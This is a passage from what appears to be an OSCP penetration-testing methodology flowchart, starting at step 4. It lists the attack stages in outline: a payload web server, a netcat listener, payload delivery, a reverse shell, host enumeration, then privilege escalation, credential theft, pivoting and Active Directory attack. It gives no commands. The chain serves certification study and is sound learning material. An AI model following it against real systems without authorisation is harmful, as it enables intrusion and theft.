4. Prepare callback infrastructure
   ├─ payload web server
   ├─ WebDAV if needed
   └─ nc listener
   ↓
5. Deliver + trigger
   ↓
6. Reverse shell
   ↓
7. whoami + host enumeration
   ↓
8. Continue OSCP chain
   PrivEsc → Credentials → Pivoting → AD → Proof
```

